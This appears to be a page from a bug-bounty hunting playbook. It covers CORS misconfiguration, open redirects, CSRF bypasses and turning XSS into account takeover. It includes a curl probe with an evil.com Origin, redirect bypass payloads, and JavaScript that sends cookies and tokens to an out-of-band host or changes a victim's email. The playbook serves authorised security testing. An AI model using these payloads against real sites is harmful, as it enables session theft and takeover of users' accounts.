# Web-Misc — CORS, Open Redirect, CSRF, XSS→ATO (chain fodder)

These are frontend-adjacent classes. johnwick is backend-focused, so **most of these are only valid
chained** (see [chaining.md](chaining.md)) — alone they're on the kill-list. Hunt them for the chain, not
the primitive.

## CORS misconfiguration
Reflected/permissive origin **plus** `Access-Control-Allow-Credentials: true` = cross-origin credentialed
read of private data.
```bash
# does the app reflect an arbitrary Origin AND allow credentials?
curl -s -I https://target/api/me -H "Origin: https://evil.com" | grep -i 'access-control-allow-'
# also try: null origin, subdomain (evil.target.com), suffix (target.com.evil.com), prefix, trailing dot
```
**Valid only if:** `Allow-Credentials: true` AND the reflected origin is attacker-controlled AND the
endpoint returns PII/secrets. PoC = an HTML page on your origin that `fetch(...,{credentials:'include'})`
and exfils the response. `*` alone (no credentials) → the browser blocks credentialed reads → usually N/A.

## Open redirect
```
?url=//evil.com   ?next=https://evil.com   ?return=/\/evil.com   ?redirect=https:evil.com
whitelist bypass: ?url=https://target.com.evil.com   ?url=https://target.com@evil.com   ?url=/%2f%2fevil.com
```
**Alone = N/A.** Valid when chained: OAuth `redirect_uri` → steal `code`/`token` (→ [auth-attacks.md](auth-attacks.md)),
or to leak a token via Referer. Always try to land it on an OAuth/SSO flow.

## CSRF (modern)
Most apps have tokens/SameSite — hunt the **gaps**, and only on **sensitive actions** → ATO.
- **SameSite bypass:** state-changing `GET`; top-level navigation (`SameSite=Lax` still sends on GET
  nav); a sibling subdomain (`Lax`/`None` sharing); method-override (`_method=PUT`, `X-HTTP-Method-Override`).
- **Content-type flip:** JSON endpoint that also accepts `text/plain`/form → send a simple-request CSRF.
- **Token gaps:** token not validated, reused across users, reflected from a param, missing on one verb.
- **Impact:** CSRF → change email/password → **ATO**; CSRF to link attacker OAuth; login/logout CSRF as a
  chain step. CSRF on a low-impact action alone = kill-list.

## XSS → ATO (turn the primitive into impact)
`alert(1)` is N/A. Convert to impact:
```javascript
// steal session / bearer / CSRF token → act as victim
fetch('https://OOB/?c='+btoa(document.cookie+'|'+localStorage.getItem('token')))
// or drive an authenticated state-change as the victim (change email → ATO)
fetch('/api/account',{method:'POST',credentials:'include',headers:{'content-type':'application/json'},
  body:JSON.stringify({email:'attacker@x.com'})})
```
**Highest value:** stored XSS in an **admin** panel → admin takeover; XSS that reads an httpOnly-exempt
token or CSRF token → full ATO. Detection sources/sinks + CSP bypasses are in [payloads.md](payloads.md).

## Proof-of-impact bar
CORS → show real PII exfiltrated cross-origin. Open redirect/CSRF → show the **chained** ATO/token theft.
XSS → show session/token theft or an action performed as the victim, not a popup.
